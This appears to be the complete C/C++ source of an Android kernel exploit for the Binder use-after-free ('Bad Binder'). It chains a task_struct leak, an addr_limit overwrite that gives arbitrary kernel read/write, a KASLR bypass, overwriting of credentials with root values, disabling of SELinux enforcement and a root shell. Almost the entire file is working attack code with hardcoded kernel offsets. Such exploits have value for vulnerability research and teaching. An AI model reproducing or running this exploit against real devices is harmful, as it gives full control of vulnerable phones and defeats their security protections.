#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdarg.h>

//
//// Defines
//

#define BINDER_THREAD_EXIT 0x40046208ul
// should be 25 (int)(408 - 16)
// This is important because last field  of struct binder_thread is task_struct and 25 * 0x10 == 400
// Therefore we won't override task_struct from before
#define IOVEC_COUNT (int)(sizeof(struct binder_thread) / sizeof(struct iovec))
// #define IOVEC_COUNT 17 // just need to be greater then 256 so iovec is in kmalloc-512
#define IOVEC_WQ_INDEX (int)(offsetof(struct binder_thread, wait) / sizeof(struct iovec)) // should be 10 (160(0xa0) - 16)
// You need to add size of pointer to wait because we will be reading from offset binder_thread->wait.head.prev
#define TASK_STRUCT_OFFSET_IN_LEAKED_DATA (int)(offsetof(struct binder_thread, task) - (offsetof(struct binder_thread, wait) + sizeof(void *))) // shoudl be 0xe8
#define OFFSET_TASK_STRUCT_ADDR_LIMIT 0xA18

#define GLOBAL_ROOT_UID (uint32_t)0
#define GLOBAL_ROOT_GID (uint32_t)0
#define SECUREBITS_DEFAULT (uint32_t)0x00000000
#define CAP_EMPTY_SET (uint64_t)0
#define CAP_FULL_SET (uint64_t)0x3FFFFFFFFF
#define NSPROXY_OFFSET_FROM_KBASE_TEXT 0x1233ac0

#define SELINUX_ENFORCING_OFFSET 0x149fe58

//
//// Structs
//

struct binder_thread
{
    uint8_t junk1[160];    /*    0    0xa0 */
    uint8_t wait[24];      /* 0xa0    0x18 */
    uint8_t junk2[216];    /* 0xb8    0xe0 */
    uint8_t task[8];       /* 0x190    0x8 */
} __attribute__((packed)); /* size:  0x198 */

struct task_struct
{
    uint8_t junk1[1256];   /*     0  0x4e8 */
    pid_t pid;             /* 0x4e8    0x4 */
    uint8_t junk2[412];    /* 0x4ec  0x19c */
    uint64_t cred;         /* 0x688    0x8 */
    uint8_t junk3[48];     /* 0x690   0x30 */
    uint64_t nsproxy;      /* 0x6c0    0x8 */
    uint8_t junk4[1944];   /* 0x6c8  0x798 */
} __attribute__((packed)); /* size:  0xe60 */

struct cred
{
    int32_t usage;            /*    0    0x4 */
    uint32_t uid;             /*  0x4    0x4 */
    uint32_t gid;             /*  0x8    0x4 */
    uint32_t suid;            /*  0xc    0x4 */
    uint32_t sgid;            /* 0x10    0x4 */
    uint32_t euid;            /* 0x14    0x4 */
    uint32_t egid;            /* 0x18    0x4 */
    uint32_t fsuid;           /* 0x1c    0x4 */
    uint32_t fsgid;           /* 0x20    0x4 */
    uint32_t securebits;      /* 0x24    0x4 */
    uint64_t cap_inheritable; /* 0x28    0x8 */
    uint64_t cap_permitted;   /* 0x30    0x8 */
    uint64_t cap_effective;   /* 0x38    0x8 */
    uint64_t cap_bset;        /* 0x40    0x8 */
    uint64_t cap_ambient;     /* 0x48    0x8 */
    uint8_t junk2[40];        /* 0x50   0x28 */
    void *security;           /* 0x78    0x8 */
    uint8_t junk3[40];        /* 0x80   0x28 */
} __attribute__((packed));    /* size:  0xA8 */

//
//// Utility functions
//

void err(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stderr, "%s", "[!] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
    exit(-1);
}

void info(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stderr, "%s", "[+] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
}

void debug(const char *format, ...)
{
    if (!format)
    {
        exit(-1);
    }

    fprintf(stderr, "%s", "[*] ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");

    getchar();
}

#include <cctype>
#include <iomanip>
#include <iostream>

// Hexdump from https://github.com/zmb3/hexdump
template <unsigned RowSize, bool ShowAscii>
struct CustomHexdump
{
    CustomHexdump(const void *data, unsigned length) : mData(static_cast<const unsigned char *>(data)), mLength(length) {}
    const unsigned char *mData;
    const unsigned mLength;
};

template <unsigned RowSize, bool ShowAscii>
std::ostream &operator<<(std::ostream &out, const CustomHexdump<RowSize, ShowAscii> &dump)
{
    out.fill('0');
    for (uint32_t i = 0; i < dump.mLength; i += RowSize)
    {
        out << "0x" << std::setw(6) << std::hex << i << ": ";
        for (uint32_t j = 0; j < RowSize; ++j)
        {
            if (i + j < dump.mLength)
            {
                out << std::hex << std::setw(2) << static_cast<int>(dump.mData[i + j]) << " ";
            }
            else
            {
                out << "   ";
            }
        }

        out << " ";
        if (ShowAscii)
        {
            for (uint32_t j = 0; j < RowSize; ++j)
            {
                if (i + j < dump.mLength)
                {
                    if (std::isprint(dump.mData[i + j]))
                    {
                        out << static_cast<char>(dump.mData[i + j]);
                    }
                    else
                    {
                        out << ".";
                    }
                }
            }
        }
        out << std::endl;
    }
    return out;
}

typedef CustomHexdump<16, true> Hexdump;

//
//// Bad Binder Exploit
//

class BadBinder
{
    void *m_lock_page;
    int m_rw_pipes[2];
    uint64_t m_kbase;
    uint64_t m_selinux_enforcing;
    struct task_struct *m_task_struct_ptr;
    int open_binder();
    int create_epoll();
    void binder_thread_exit(int binder_fd);
    void epoll_del(int epfd, int binder_fd);
    void epoll_add(int epfd, int binder_fd);
    void bind_cpu();

public:
    BadBinder();
    ~BadBinder();
    void create_lock_page();
    void leak_task_struct();
    void trigger();
    void override_addr_limit();
    void create_rw_pipes();
    void arb_read(char *buf, char *addr, ssize_t size);
    void arb_write(char *addr, char *buf, ssize_t size);
    uint32_t read_u32(uint64_t addr);
    uint64_t read_u64(uint64_t addr);
    void write_u32(uint64_t addr, uint32_t val);
    void write_u64(uint64_t addr, uint64_t val);
    void verify_arb_rw();
    void override_cred_with_init_cred();
    void get_kbase();
    void override_selinux_enforcing();
    void spawn_shell();
    void check_root();
};

BadBinder::BadBinder()
{
    info("Getting id");
    system("id");
    info("Getting uname");
    system("uname -a");
    info("Getting fingerprint");
    system("getprop ro.build.fingerprint");
    bind_cpu();
    create_lock_page();
}

/**
 * Bind CPU to core 0 so that exploit uses same SLUB
 */
void BadBinder::bind_cpu()
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);

    info("Bind CPU");

    int ret = sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set);

    if (ret < 0)
    {
        err("Failed to bind CPU: 0x%x", errno);
    }
}
int BadBinder::open_binder()
{
    int binder_fd = open("/dev/binder", O_RDONLY);

    if (binder_fd < 0)
    {
        printf("Failed to open binder");
        return -1;
    }

    return binder_fd;
}

/**
 * Create epoll and add binder to it.
 */
int BadBinder::create_epoll()
{

    int epfd = epoll_create(1); // size doesn't matter as long as it's > 0

    return epfd;
}

/**
 * Exit will free binder_thread
 */
void BadBinder::binder_thread_exit(int binder_fd)
{
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
}

// Will unlink epoll wait which is wait_queue from binder_thread
void BadBinder::epoll_del(int epfd, int binder_fd)
{
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, NULL);
}

/**
 * This will cause epoll_wait wait->whead and wait->entry to point to binder_thread
 */
void BadBinder::epoll_add(int epfd, int binder_fd)
{
    struct epoll_event event = {.events = EPOLLIN};

    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event);
}
/**
 * mmap 4g aligned page
 * For UaF, we need address that lower 32bit is all zero.
 * This will be used to replace lock in binder_thread
 */
void BadBinder::create_lock_page()
{

    m_lock_page = mmap(
        (void *)0x100000000ul,
        PAGE_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0);

    if (!m_lock_page || m_lock_page != (void *)0x100000000ul)
    {
        err("Unable to mmap 4GB aligned page");
        exit(EXIT_FAILURE);
    }
}

/**
 * Original Trigger from syzkaller
 */
void BadBinder::trigger()
{
    int binder_fd = open_binder();
    int epfd = create_epoll();
    epoll_add(epfd, binder_fd);

    binder_thread_exit(binder_fd);
}

// list_del dump during unlinking
// __list_del
//  next: 0xffff88803a8fcca8
//  prev: 0xffff88803a8fcca8
//  next->prev: 0x0000000041414141
//  prev->next: 0x0000000000001000
//          next->prev = prev
//          prev->next = next

// dump after leak read
// 0x000000: a8 cc 8f 3a 80 88 ff ff a8 cc 8f 3a 80 88 ff ff  ...:.......:....
// 0x000010: 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
//                             [...]
// 0x0000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
// 0x0000e0: 00 00 00 00 00 00 00 00 00 ee 81 3a 80 88 ff ff  ...........:....
void BadBinder::leak_task_struct()
{
    info("Leaking task_struct");
    int pipe_fd[2] = {0};
    char data_buffer[PAGE_SIZE] = {0};
    struct iovec iovecs[IOVEC_COUNT] = {};
    ssize_t bytes_read = 0;

    int binder_fd = open_binder();

    int epfd = create_epoll();

    //
    //// Create pipe
    //

    if (pipe(pipe_fd) == -1)
    {
        err("\tUnable to create pipe");
    }
    else
    {
        info("\tPipe created successfully");
    }

    // pipe_fd[0] = read fd
    // pipe_fd[1] = write fd
    //
    // Default size of pipe is 65536 = 0x10000 = 64KB
    // This is way much of data that we care about
    // Let's reduce the size of pipe to 0x1000
    if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) == -1)
    {
        err("\tUnable to change the pipe capacity");
    }
    else
    {
        info("\tChanged the pipe capacity to: 0x%x", PAGE_SIZE);
    }

    info("\tMapped page: %p", m_lock_page);
    // next->prev = prev
    // prev->next = next
    iovecs[IOVEC_WQ_INDEX].iov_base = m_lock_page;            // binder_thread->wait.lock
    iovecs[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE;               // binder_thread->wait.head.next
    iovecs[IOVEC_WQ_INDEX + 1].iov_base = (void *)0x41414141; // binder_thread->wait.head.prev
    iovecs[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE;

    //
    //// Adding binder_thread->wait to epoll wait_queue
    //
    epoll_add(epfd, binder_fd);

    pid_t leak_pid = fork();

    if (leak_pid == 0)
    {
        info("\t(CHILD): process sleep");

        sleep(2);

        //
        //// This will trigger the unlink
        //
        info("\t(CHILD): Triggering the unlink");
        epoll_del(epfd, binder_fd);

        info("\t(CHILD): Block read until junk data");
        bytes_read = read(pipe_fd[0], data_buffer, PAGE_SIZE);

        if (bytes_read != PAGE_SIZE)
        {
            err("\t(CHILD): failed. read: 0x%lx but expected 0x%lx", bytes_read, PAGE_SIZE);
        }
        info("\t(CHILD): unblocked. finished reading junk");

        exit(EXIT_SUCCESS);
    }

    //
    //// Free binder_thread
    //
    binder_thread_exit(binder_fd);

    //
    //// Fill in freed binder_thread with our iovecs
    //

    // careful not to print or do any operation. This will cause it not to work since we are trying to race

    ssize_t bytes_written = writev(pipe_fd[1], iovecs, IOVEC_COUNT);
    info("\t(PARENT): bytes_written: 0x%lx", bytes_written);
    if (bytes_written != PAGE_SIZE * 2)
    {
        err("\twritev failed. nBytesWritten: 0x%lx, expected: 0x%x", bytes_written, PAGE_SIZE * 2);
    }
    else
    {
        info("\tWrote 0x%lx bytes", bytes_written);
    }

    //
    //// Read corrupted iovec
    //
    info("\tReading leaked data");
    bytes_read = read(pipe_fd[0], data_buffer, PAGE_SIZE);
    if (bytes_read != PAGE_SIZE)
    {
        err("read failed. bytes_read: 0x%lx, expected: 0x%x", bytes_read, PAGE_SIZE);
    }

    //
    //// Wait till child exit
    //
    wait(nullptr);
    std::cout << Hexdump(data_buffer, 0x100) << std::endl;

    struct task_struct *task = (struct task_struct *)*((int64_t *)(data_buffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA));
    info("\ttask_struct: 0x%lx", task);
    m_task_struct_ptr = task;
}
void BadBinder::override_addr_limit()
{
    info("Overriding addr_limit");
    ssize_t bytes_written = 0;
    struct msghdr message = {};
    struct iovec iovecs[IOVEC_COUNT] = {};
    int sock_fd[2] = {0};

    //
    //// get binder
    //
    int binder_fd = open_binder();

    //
    //// create epoll
    //

    int epfd = create_epoll();

    info("\tSetting up socket");

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) == -1)
    {
        err("\tUnable to create socket pair");
    }
    else
    {
        info("\tSocket pair created successfully");
    }

    //
    //// Send one byte to the socket so that when recvmsg is called, it creates first iovec
    //

    static char junk_sock_data[] = {
        0x41};

    bytes_written = write(sock_fd[1], junk_sock_data, sizeof(junk_sock_data));

    if (bytes_written != sizeof(junk_sock_data))
    {
        err("\tUnable to write to socket");
    }
    else
    {
        info("\tWrote 0x%lx bytes to socket", bytes_written);
    }

    info("\tSet up iovecs");

    iovecs[IOVEC_WQ_INDEX].iov_base = m_lock_page;            // binder_thread->wait.lock
    iovecs[IOVEC_WQ_INDEX].iov_len = 1;                       // binder_thread->wait.head.next
    iovecs[IOVEC_WQ_INDEX + 1].iov_base = (void *)0x41414141; // binder_thread->wait.head.prev
    iovecs[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8;
    iovecs[IOVEC_WQ_INDEX + 2].iov_base = (void *)0x42424242;
    iovecs[IOVEC_WQ_INDEX + 2].iov_len = 0x8;

    uint64_t addr_limit_ptr = (uint64_t)((uint8_t *)m_task_struct_ptr + OFFSET_TASK_STRUCT_ADDR_LIMIT);
    info("\taddr_limit_ptr: 0x%lx", addr_limit_ptr);
    static uint64_t override_binder_thread_wait[] = {
        0x1,                   // iovecs[IOVEC_WQ_INDEX].iov_len
        0x41414141,            // iovecs[IOVEC_WQ_INDEX + 1].iov_base
        0x8 + 0x8 + 0x8 + 0x8, // iovecs[IOVEC_WQ_INDEX + 1].iov_len
        addr_limit_ptr,        // iovecs[IOVEC_WQ_INDEX + 2].iov_base
        0xFFFFFFFFFFFFFFFE     // addr_limit value. It will be written to addr_limit_ptr above
    };

    message.msg_iov = iovecs;
    message.msg_iovlen = IOVEC_COUNT;

    // link poll wait queue  to binder thread
    epoll_add(epfd, binder_fd);

    pid_t child_pid = fork();

    if (child_pid == 0)
    {
        info("\t(CHILD): Sleeping for 2 seconds");
        sleep(2);

        // list del
        // iovecs[IOVEC_WQ_INDEX].iov_len = 1;  // binder_thread->wait.head.next = binder_thread->wait
        // iovecs[IOVEC_WQ_INDEX + 1].iov_base = (void *)0x41414141; // binder_thread->wait.head.prev = binder_thread->wait
        epoll_del(epfd, binder_fd);

        info("\t(CHILD): Writing to socket with override_binder_thread_wait");
        // when you write this it will override the iovecs[IOVEC_WQ_INDEX].iov_len = 1; and onward
        bytes_written = write(sock_fd[1], override_binder_thread_wait, sizeof(override_binder_thread_wait));

        if (bytes_written != sizeof(override_binder_thread_wait))
        {
            err("\t(CHILD): bytes_written: 0x%lx, expected: 0x%lx", bytes_written, sizeof(override_binder_thread_wait));
        }

        exit(EXIT_SUCCESS);
    }

    binder_thread_exit(binder_fd);

    // recvmsg will recv block until the child writes to the socket
    // first it will read the junk data
    // then it will write the socket data to second iovecs. this will write to where binder_thread->wait is. this will cause third write to recv to our own addr
    // third write will finally write to addr_limit with -2
    ssize_t bytes_received = recvmsg(sock_fd[0], &message, MSG_WAITALL);
    info("\t(PARENT): Reading from socket received 0x%lx bytes", bytes_received);

    ssize_t expected_bytes_received = iovecs[IOVEC_WQ_INDEX].iov_len +
                                      iovecs[IOVEC_WQ_INDEX + 1].iov_len +
                                      iovecs[IOVEC_WQ_INDEX + 2].iov_len;

    if (bytes_received != expected_bytes_received)
    {
        err("\tbytes_received: 0x%lx, expected: 0x%lx", bytes_received, expected_bytes_received);
    }

    wait(nullptr);

    // debug("Paused. Press Enter to continue.\ncheck if addr_limit @ 0x%lx is -2 from gdb", addr_limit_ptr);
}

void BadBinder::create_rw_pipes()
{
    if (pipe(m_rw_pipes) == -1)
    {
        err("Unable to create rw pipes");
    }
    else
    {
        info("Created rw pipes");
    }

    verify_arb_rw();
}

void BadBinder::arb_read(char *buf, char *addr, ssize_t size)
{
    info("arb_read: addr: 0x%lx, size: 0x%lx", addr, size);
    // write to pipe
    if (write(m_rw_pipes[1], addr, size) != size)
    {
        err("\tUnable to write to pipe");
    }

    // read from pipe
    if (read(m_rw_pipes[0], buf, size) != size)
    {
        err("\tUnable to read from pipe");
    }
}

void BadBinder::arb_write(char *addr, char *buf, ssize_t size)
{
    info("arb_write: addr: 0x%lx, size: 0x%lx", addr, size);
    // write to pipe
    if (write(m_rw_pipes[1], buf, size) != size)
    {
        err("\tUnable to write to pipe");
    }

    // read from pipe
    if (read(m_rw_pipes[0], addr, size) != size)
    {
        err("\tUnable to read from pipe");
    }
}

uint32_t BadBinder::read_u32(uint64_t addr)
{
    uint32_t val = 0;
    arb_read((char *)&val, (char *)addr, sizeof(val));
    return val;
}

void BadBinder::write_u32(uint64_t addr, uint32_t val)
{
    arb_write((char *)addr, (char *)&val, sizeof(val));
}

uint64_t BadBinder::read_u64(uint64_t addr)
{
    uint64_t val = 0;
    arb_read((char *)&val, (char *)addr, sizeof(val));
    return val;
}

void BadBinder::write_u64(uint64_t addr, uint64_t val)
{
    arb_write((char *)addr, (char *)&val, sizeof(val));
}

void BadBinder::verify_arb_rw()
{
    info("Verifying arb_rw");
    uint64_t addr_limit_ptr = (uint64_t)((uint8_t *)m_task_struct_ptr + OFFSET_TASK_STRUCT_ADDR_LIMIT);
    uint64_t addr_limit = read_u64(addr_limit_ptr);
    if (addr_limit != 0xFFFFFFFFFFFFFFFE)
    {
        err("arb_read doesn'twork\naddr_limit: 0x%lx, expected: 0xFFFF_FFFF_FFFF_FFFE", addr_limit);
    }

    write_u64(addr_limit_ptr, 0xFFFFFFFFFFFFFFFD);

    addr_limit = read_u64(addr_limit_ptr);
    if (addr_limit != 0xFFFFFFFFFFFFFFFD)
    {
        err("arb_write doesn't work\naddr_limit: 0x%lx, expected: 0xFFFF_FFFF_FFFF_FFFD", addr_limit);
    }
}

// struct cred init_cred = {
//      .usage              = ATOMIC_INIT(4),
//      .uid                = GLOBAL_ROOT_UID,
//      .gid                = GLOBAL_ROOT_GID,
//      .suid               = GLOBAL_ROOT_UID,
//      .sgid               = GLOBAL_ROOT_GID,
//      .euid               = GLOBAL_ROOT_UID,
//      .egid               = GLOBAL_ROOT_GID,
//      .fsuid              = GLOBAL_ROOT_UID,
//      .fsgid              = GLOBAL_ROOT_GID,
//      .securebits         = SECUREBITS_DEFAULT,
//      .cap_inheritable    = CAP_EMPTY_SET,
//      .cap_permitted      = CAP_FULL_SET,
//      .cap_effective      = CAP_FULL_SET,
//      .cap_bset           = CAP_FULL_SET,
//      .user               = INIT_USER,
//      .user_ns            = &init_user_ns,
//      .group_info         = &init_groups,
// };
void BadBinder::override_cred_with_init_cred()
{

    info("Overriding cred with init_cred");
    uint64_t cur_cred_ptr = (uint64_t)m_task_struct_ptr+ offsetof(struct task_struct, cred);
    info("\ttask_struct: 0x%lx", m_task_struct_ptr);
    info("\tcred_offset: 0x%lx", offsetof(struct task_struct, cred));
    info("\tcred: 0x%lx", cur_cred_ptr);
    uint64_t cur_cred = read_u64(cur_cred_ptr);
    info("\tcur_cred: 0x%lx", cur_cred);

    write_u64(cur_cred + offsetof(struct cred, uid), GLOBAL_ROOT_UID);
    write_u64(cur_cred + offsetof(struct cred, gid), GLOBAL_ROOT_GID);
    write_u64(cur_cred + offsetof(struct cred, suid), GLOBAL_ROOT_UID);
    write_u64(cur_cred + offsetof(struct cred, sgid), GLOBAL_ROOT_GID);
    write_u64(cur_cred + offsetof(struct cred, euid), GLOBAL_ROOT_UID);
    write_u64(cur_cred + offsetof(struct cred, egid), GLOBAL_ROOT_GID);
    write_u64(cur_cred + offsetof(struct cred, fsuid), GLOBAL_ROOT_UID);
    write_u64(cur_cred + offsetof(struct cred, fsgid), GLOBAL_ROOT_GID);
    write_u64(cur_cred + offsetof(struct cred, securebits), SECUREBITS_DEFAULT);
    write_u64(cur_cred + offsetof(struct cred, cap_inheritable), CAP_EMPTY_SET);
    write_u64(cur_cred + offsetof(struct cred, cap_permitted), CAP_FULL_SET);
    write_u64(cur_cred + offsetof(struct cred, cap_effective), CAP_FULL_SET);
    write_u64(cur_cred + offsetof(struct cred, cap_bset), CAP_FULL_SET);
    write_u64(cur_cred + offsetof(struct cred, cap_ambient), CAP_EMPTY_SET);
}

void BadBinder::get_kbase()
{
    info("Getting kaslr base by leaking nsproxy from task_struct");
    uint64_t nsproxy = read_u64((uint64_t)m_task_struct_ptr + offsetof(struct task_struct, nsproxy));
    info("nsproxy: 0x%lx", nsproxy); 

    m_kbase  = nsproxy - NSPROXY_OFFSET_FROM_KBASE_TEXT;
    info("kbase: 0x%lx", m_kbase);
    m_selinux_enforcing = m_kbase + SELINUX_ENFORCING_OFFSET;
    info("selinux_enforing addr: 0x%lx", m_selinux_enforcing);
}

void BadBinder::override_selinux_enforcing()
{
    info("Overriding selinux_enforcing");
    write_u32(m_selinux_enforcing, 0);
}

void BadBinder::spawn_shell()
{
    info("Spawning shell");
    system("/bin/sh");
}

void BadBinder::check_root()
{
    if (getuid() != 0)
    {
        err("Not root");
    }
}

int main()
{
    BadBinder *bb = new BadBinder();

    bb->leak_task_struct();
    bb->override_addr_limit();
    bb->create_rw_pipes();
    bb->get_kbase();
    bb->override_cred_with_init_cred();
    bb->override_selinux_enforcing();
    bb->check_root();
    bb->spawn_shell();
}
